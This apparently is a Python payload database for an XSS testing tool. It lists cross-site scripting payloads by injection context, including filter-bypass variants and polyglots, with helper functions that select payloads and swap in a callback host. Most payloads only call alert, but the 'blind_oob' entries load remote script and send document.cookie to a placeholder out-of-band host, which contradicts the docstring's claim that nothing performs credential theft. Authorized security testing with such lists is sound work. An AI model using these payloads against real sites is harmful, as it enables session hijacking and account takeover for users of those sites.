"""WarpZone XSS arsenal: the payload database.

Organized by attack class; `for_context()` picks the right family for a
reflection context. Payloads are BENIGN proof-of-concept markers (alert only)
for authorized bug-bounty work - nothing here performs credential theft,
data exfiltration or WAF-evasion-for-evil; the "bypass" entries exist to test
whether a filter is really context-aware.
"""

PAYLOADS = {
    "basic": [
        "<script>alert(1)</script>",
        "<script>alert('warpzone')</script>",
        "<script src=x></script>",
    ],
    "event_handlers": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)></video>",
        "<audio src=x onerror=alert(1)>",
        "<iframe srcdoc='<svg onload=alert(1)>'></iframe>",
        "<iframe src=javascript:alert(1)></iframe>",
        "<object data=javascript:alert(1)>",
        "<form><button formaction=javascript:alert(1)>x</button></form>",
    ],
    "tag_breaker": [
        '"><img src=x onerror=alert(1)>',
        "'><svg onload=alert(1)>",
        '"><svg/onload=alert(1)>',
        '"/><img src=x onerror=alert(1)>',
        "><script>alert(1)</script>",
        "</p><img src=x onerror=alert(1)>",
    ],
    "script_breaker": [
        "</script><script>alert(1)</script>",
        "</script><img src=x onerror=alert(1)>",
        "</script><svg onload=alert(1)>",
        "</script></div><script>alert(1)</script>",
    ],
    "attr_breaker_dq": [
        '"><img src=x onerror=alert(1)>',
        '" onmouseover=alert(1) x="',
        '" onfocus=alert(1) autofocus x="',
        '" onclick=alert(1) x="',
        '" javascript:alert(1) x="',
        '"><svg onload=alert(1)>',
    ],
    "attr_breaker_sq": [
        "'><img src=x onerror=alert(1)>",
        "' onmouseover=alert(1) x='",
        "' onfocus=alert(1) autofocus x='",
        "'><svg onload=alert(1)>",
    ],
    "js_string": [
        "';alert(1)//",
        '";alert(1)//',
        "';alert(1)//\"",
        "</script><script>alert(1)</script>",
        "';alert(String.fromCharCode(119,97,122))//",
        "`+alert(1)+`",
        "${alert(1)}",
    ],
    "js_code": [
        ";alert(1)//",
        "alert(1)//",
        "\";alert(1)//",
        ";alert(1);\"",
        "${alert(1)}",
    ],
    "javascript_url": [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "java\tscript:alert(1)",
        "javascript&#58;alert(1)",
        "&#106;avascript:alert(1)",
        "data:text/html,<svg onload=alert(1)>",
    ],
    "html_comment": [
        "--><img src=x onerror=alert(1)>",
        "--><script>alert(1)</script>",
        "--!><svg onload=alert(1)>",
    ],
    "css_context": [
        "</style><img src=x onerror=alert(1)>",
        "</style><script>alert(1)</script>",
        "expression(alert(1))",
    ],
    "dom_hash": [
        "#<img src=x onerror=alert(1)>",
        "#\"><img src=x onerror=alert(1)>",
        "javascript:alert(1)#",
        "#<svg onload=alert(1)>",
    ],
    "polyglot": [
        ("javascript:/*--></title></style></textarea></script></xmp>"
         "<svg/onload='+/\"/+/onmouseover=alert(1)//'>"),
        ("\"'></textarea></style></script><svg onload=alert(1)>\""),
        ("<img src=1 onerror=alert(1)>//\"//\"//'"
         "<svg onload=alert(1)>"),
    ],
    "filter_probe": [
        "<>\"'`{}()",                       # raw: what chars survive?
        "<svg onl~oad=alert(1)>",           # event-handler filter checks
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<script>alert(1);//<</script>",
        "<script>alert&lpar;1&rpar;</script>",
        "<img src=x onErRoR=alert(1)>",
        "<SVG ONLOAD=ALERT(1)>",
        "%3Csvg%20onload%3Dalert(1)%3E",
        "%253Csvg%2520onload%253Dalert(1)%253E",
        "&#60;svg onload=alert(1)&#62;",
    ],
    "blind_oob": [
        "<script src=https://YOUR-OAST-HOST/wz.js></script>",
        "<img src=https://YOUR-OAST-HOST/wz.png>",
        "javascript:fetch('https://YOUR-OAST-HOST/wz?c='+document.cookie)",  # authorized labs only
    ],
}

CONTEXT_MAP = {
    "html_body": ["basic", "event_handlers", "tag_breaker", "polyglot"],
    "attr_value_dq": ["attr_breaker_dq", "event_handlers", "polyglot"],
    "attr_value_sq": ["attr_breaker_sq", "event_handlers", "polyglot"],
    "attr_value_bare": ["event_handlers", "attr_breaker_dq"],
    "tag_name": ["event_handlers", "basic"],
    "html_comment": ["html_comment", "tag_breaker"],
    "css": ["css_context", "tag_breaker"],
    "js_string": ["js_string", "script_breaker"],
    "js_code": ["js_code", "script_breaker"],
    "javascript_url": ["javascript_url"],
    "unknown": ["basic", "event_handlers", "attr_breaker_dq", "js_string",
                "javascript_url", "filter_probe"],
}


def for_context(context, max_payloads=8):
    """Ordered payload list fitted to a reflection context."""
    fams = CONTEXT_MAP.get(context, CONTEXT_MAP["unknown"])
    out = []
    for fam in fams:
        out.extend(PAYLOADS.get(fam, []))
    seen, uniq = set(), []
    for p in out:
        if p not in seen:
            seen.add(p)
            uniq.append(p)
    return uniq[:max_payloads]


def canaryfy(payload, canary):
    """Swap alert(1) -> alert('<canary>') so a response hit proves the WHOLE
    payload survived the filter, not just a fragment."""
    return payload.replace("alert(1)", "alert('%s')" % canary)


def oob_replace(payload, host):
    return payload.replace("YOUR-OAST-HOST", host)
